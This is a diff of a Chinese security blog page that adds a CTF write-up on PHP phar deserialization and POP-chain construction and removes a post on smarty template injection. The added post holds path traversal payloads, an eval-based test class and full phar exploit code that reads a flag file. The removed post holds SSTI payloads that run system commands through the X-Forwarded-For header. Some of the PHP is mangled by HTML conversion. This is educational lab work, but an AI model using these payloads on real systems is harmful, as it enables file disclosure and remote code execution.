@@ -114,7 +114,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 12.86px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 12.5px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.5px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.25px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 13.75px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -171,6 +171,191 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-phar反序列化以及pop链的构造" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/18/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8Apop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0/" class="article-date">
+  	<time datetime="2021-09-17T16:00:00.000Z" itemprop="datePublished">2021-09-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/18/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8Apop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0/">
+        phar反序列化以及pop链构造
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="phar反序列化以及pop链构造"><a href="#phar反序列化以及pop链构造" class="headerlink" title="phar反序列化以及pop链构造"></a>phar反序列化以及pop链构造</h1><p>打开页面是一个登录界面，试着sql注入，发现不行，然后注册后登录发现是上传文件，尝试着上传一个一句话木马，然后没有回显路径，但是点击下载后，抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /download.php HTTP/1.1</span><br><span class="line">Host: 32c12092-57dd-43b8-91a4-92f60c34dca1.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 20</span><br><span class="line">Origin: http://32c12092-57dd-43b8-91a4-92f60c34dca1.node4.buuoj.cn:81</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://32c12092-57dd-43b8-91a4-92f60c34dca1.node4.buuoj.cn:81/index.php</span><br><span class="line">Cookie: UM_distinctid=17ae21e0e7f4c7-0fd161bcfd1ad38-4c3e257a-186a00-17ae21e0e80551; PHPSESSID=3f263faaafa24915e707947db445f70f</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">filename=shell15.jpg</span><br></pre></td></tr></table></figure>
+<p>发现有一个filename可以直接利用来获取文件，因此，我们尝试构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=../../flag.php</span><br></pre></td></tr></table></figure>
+<p>发现不可以下载，然后我们可以试着利用获取源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filename=../../class.php</span><br><span class="line"></span><br><span class="line">filename=../../login.php</span><br><span class="line"></span><br><span class="line">filename=../../download.php</span><br><span class="line"></span><br><span class="line">filename=../../index.php</span><br><span class="line"></span><br><span class="line">filename=../../delete.php</span><br><span class="line"></span><br><span class="line">filename=../../upload.php</span><br></pre></td></tr></table></figure>
+<p>获取源码后，我们可以看class.php文件，发现有数据库交互的语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public function user_exist($username) &#123;</span><br><span class="line">      $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);</span><br></pre></td></tr></table></figure>
+<p>可见username参数的值已经被确定了，所以无法进行sql注入，然后我们再看向download.php文件，发现下载的文件名过滤了flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chdir($_SESSION[&#x27;sandbox&#x27;]);</span><br><span class="line">$file = new File();</span><br><span class="line">$filename = (string) $_POST[&#x27;filename&#x27;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123;</span><br><span class="line">    Header(&quot;Content-type: application/octet-stream&quot;);</span><br><span class="line">    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));</span><br><span class="line">    echo $file-&gt;close();</span><br></pre></td></tr></table></figure>
+<p>其中chdir()函数是用来目录跳跃的，所以我们在获取文件时，需要../../来读取上层目录的文件。同时由于过滤了flag文件名，所以不能使用这个方法我们需要使用其它的方法</p>
+<p>看到__call()这个魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __call($func, $args) &#123;</span><br><span class="line">      array_push($this-&gt;funcs, $func);</span><br><span class="line">      foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">          $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时看到close()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function close() &#123;</span><br><span class="line">       return file_get_contents($this-&gt;filename);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>中的file_get_contents()函数，可以判断使用phar反序列化加pop链</p>
+<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h3 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h3><p>phar由四部分构成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. stub</span><br><span class="line">phar文件标识，格式为xxx&lt;?php xxx;__HALT_COMPILER();?&gt;，只要由__HALT_COMPILER();?&gt;这个标识作为结尾，则前面的内容是不限定的，因此可以随意伪造文件头</span><br><span class="line"></span><br><span class="line">2. mainfest</span><br><span class="line">压缩文件的属性等信息，以序列化存储</span><br><span class="line"></span><br><span class="line">3. contents</span><br><span class="line">压缩文件内容</span><br><span class="line"></span><br><span class="line">4. signature</span><br><span class="line">签名，放在文件末尾</span><br></pre></td></tr></table></figure>
+<p>phar存储的meta-data信息以序列化的方式存储，而当文件操作函数通过phar://伪协议解析phar文件时会将数据反序列化，其中文件操作函数为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">fileatime()</span><br><span class="line">filectime()</span><br><span class="line">file_exists()</span><br><span class="line">file_get_contents()</span><br><span class="line">file_put_contents()</span><br><span class="line">file()</span><br><span class="line">filegroup()</span><br><span class="line">fopen()</span><br><span class="line">fileinode()</span><br><span class="line">filemtime()</span><br><span class="line">fileowner()</span><br><span class="line">fileperms()</span><br><span class="line">is_dir()</span><br><span class="line">is_executable()</span><br><span class="line">is_file()</span><br><span class="line">is_link()</span><br><span class="line">is_readable()</span><br><span class="line">is_writable()</span><br><span class="line">is_writeable()</span><br><span class="line">parse_ini_file()</span><br><span class="line">copy()</span><br><span class="line">unlink()</span><br><span class="line">stat()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure>
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php</span><br></pre></td></tr></table></figure>
+<?php
+
+class Testobj
+{
+    var $output="echo 'ok';";
+    function __destruct()
+    {
+        eval($this->output);
+    }
+}
+if(isset($_GET['filename']))
+{
+    $filename=$_GET['filename'];
+    var_dump(file_exists($filename));
+}
+?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后使用这个phar.php文件生成phar文件</span><br></pre></td></tr></table></figure>
+<?php
+class Testobj
+{
+  var $output='';
+}
+
+@unlink('test.phar');   //删除之前的test.par文件(如果有)
+$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
+$phar->startBuffering();  //开始写文件
+$phar->setStub('<?php __HALT_COMPILER(); ?><p>‘);  //写入stub<br>$o=new Testobj();<br>$o-&gt;output=’eval($_GET[“a”]);’;<br>$phar-&gt;setMetadata($o);//写入meta-data<br>$phar-&gt;addFromString(“test.txt”,”test”);  //添加要压缩的文件<br>$phar-&gt;stopBuffering();<br>?&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后放在同一目录中，其中运行时，需要在php.ini文件中设置</span><br></pre></td></tr></table></figure>
+<p>phar.readonly = Off</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意在ini文件中;为注释符，然后构造</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?filename=phpinfo()">http://127.0.0.1/test.php?filename=phpinfo()</a>;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">则可以获得php版本</span><br><span class="line"></span><br><span class="line">回到原来题目本身</span><br><span class="line"></span><br><span class="line">有几个魔术方法</span><br></pre></td></tr></table></figure>
+<p>__call()————————————-在对象调用的方法不存在时。会自动触发</p>
+<p>__destruct()——————————-会在销毁对象时自动触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而我们可以看见close()方法中有file_get_contents()函数，所以我们只需控制$this-&gt;filename这个参数即可，而调用这个close()方法，而download.php文件和delect.php文件都有这个函数，但是download.php文件中的</span><br></pre></td></tr></table></figure>
+<p>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">限制了访问目录只能在当前目录(getcwd())、/etc和/tmp目录，所以不可以使用，但是我们可以使用delect.php来读取，我们可以构造一条简单的链条</span><br></pre></td></tr></table></figure>
+<p>当delect.php文件中的$file-&gt;detele()是，会触发class.php文件中的user类中的__destruct()魔术方法中的$this-&gt;db-&gt;close();</p>
+<p>而我们可以直接将$this-&gt;db作为file类，然后调用close()方法，之后只要我们控制file类中的$filename即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">按上面写exp</span><br></pre></td></tr></table></figure>
+<?php
+class User {
+    public $db;
+}
+class File {
+    public $filename = "/flag.txt";
+}
+$a = new User();
+$a->db = new File();
+?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是没有回显，所以我们可以利用FileList类中的__call()魔术方法和__destruct()魔术方法来通过</span><br></pre></td></tr></table></figure>
+<p>echo $table;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">来打印读取文件的信息，所以我们需要构造新的pop链</span><br></pre></td></tr></table></figure>
+<p>首先，delete.php文件中的$file-&gt;detele();会调用File类中的delect()方法</p>
+<p>然后，detele()函数中的unlink()函数会触发user类的魔术方法__destruct()</p>
+<p>而构造$this-&gt;db为new FileList()类，来调用不存在FileList类中的close()方法，从而触发FileList类中魔术方法__call()方法和__destruct()方法来通过echo $table;打印回显信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中__cal($fun,$args)魔术方法中的$fun为被调用的方法，而$args为被调用方法中的参数，而当创建新的类的时候会触发魔术方法__contruct()，其中魔术方法__contruct()</span><br></pre></td></tr></table></figure>
+<p> public function __construct($path) {<br>        $this-&gt;files = array();<br>        $this-&gt;results = array();<br>        $this-&gt;funcs = array();<br>        $filenames = scandir($path);</p>
+<pre><code>    $key = array_search(&quot;.&quot;, $filenames);
+    unset($filenames[$key]);
+    $key = array_search(&quot;..&quot;, $filenames);
+    unset($filenames[$key]);
+
+    foreach ($filenames as $filename) &#123;
+        $file = new File();
+        $file-&gt;open($path . $filename);
+        array_push($this-&gt;files, $file);
+        $this-&gt;results[$file-&gt;name()] = array();
+    &#125;
+&#125;
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将phar压缩文件中的文件放进数组中，然后__call()魔术方法将调用的方法close()放进数组中，并将遍历每一个文件，让每一个文件都调用close()方法，并存储于二维数组中，而后FileList类中的__destruct()魔术方法会将利用</span><br></pre></td></tr></table></figure>
+<p>foreach ($this-&gt;results as $filename =&gt; $result) {<br>            $table .= ‘<tr>‘;<br>            foreach ($result as $func =&gt; $value) {</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">会将每个二维数组中的值给$table，并通过</span><br></pre></td></tr></table></figure>
+<p>echo $table;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打印出来，所以我们可以写exp</span><br><span class="line">phar.php</span><br></pre></td></tr></table></figure>
+<?php
+class User {
+    public $db;
+}
+class File {
+    public $filename;
+}
+class FileList {
+    private $files;
+    public function __construct() {
+        $file = new File();
+        $file->filename = "/flag.txt";
+        $this->files = array($file);
+    }
+}
+ 
+$a = new User();
+$a->db = new FileList();
+ 
+$phar = new Phar("phar.phar"); //后缀名必须为phar
+ 
+$phar->startBuffering();
+ 
+$phar->setStub("<?php __HALT_COMPILER(); ?><p>“); //设置stub</p>
+<p>$o = new User();<br>$o-&gt;db = new FileList();</p>
+<p>$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest<br>$phar-&gt;addFromString(“exp.txt”, “test”); //添加要压缩的文件<br>//签名自动计算<br>$phar-&gt;stopBuffering();<br>?&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过php运行phar.php来生成phar.phar文件，之后点击删除，并抓包，将filename中的值改为</span><br></pre></td></tr></table></figure>
+<p>filename=phar://phar.phar</p>
+<p>```<br>就可以读出flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-cookie和盲注" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1015,76 +1200,6 @@ __destruct()--------------------在类的对象被销毁之前被调用
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-smarty模板及X-Forwarded-For" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/09/smarty%E6%A8%A1%E6%9D%BF%E5%8F%8AX-Forwarded-For/" class="article-date">
-  	<time datetime="2021-09-08T16:00:00.000Z" itemprop="datePublished">2021-09-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/09/smarty%E6%A8%A1%E6%9D%BF%E5%8F%8AX-Forwarded-For/">
-        smarty模板及X-Forwarded-For
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="smarty模板及X-Forwarded-For"><a href="#smarty模板及X-Forwarded-For" class="headerlink" title="smarty模板及X-Forwarded-For"></a>smarty模板及X-Forwarded-For</h1><p>打开页面，我们看见X-Forwared-For这个提示，所以我们可以想到可能是smarty模板注入，因为X-Forwared-For是用smarty模板引擎解析的，所以我们可以抓包，然后构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwared-For: &#123;7*7&#125;</span><br></pre></td></tr></table></figure>
-<p>发现它返回了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client ip: 49</span><br></pre></td></tr></table></figure>
-<p>所以存在smarty模板漏洞，所以我们可以再构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwared-For: &#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure>
-<p>来查看smarty的版本，发现是3.1.3版本，我们可以使用{if }{/if}标签来注入，所以我们可以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwared-For: &#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
-<p>来查当前的文件，然后用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwared-For: &#123;if system(&#x27;cat /index.php)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
-<p>来读取文件，然后我们只需要找到flag所在文件夹即可</p>
-<p>详细可以看我的smarty模板漏洞或各类模板漏洞那两篇 </p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF/" rel="tag">模板</a></li></ul>
 	</div>
 
       
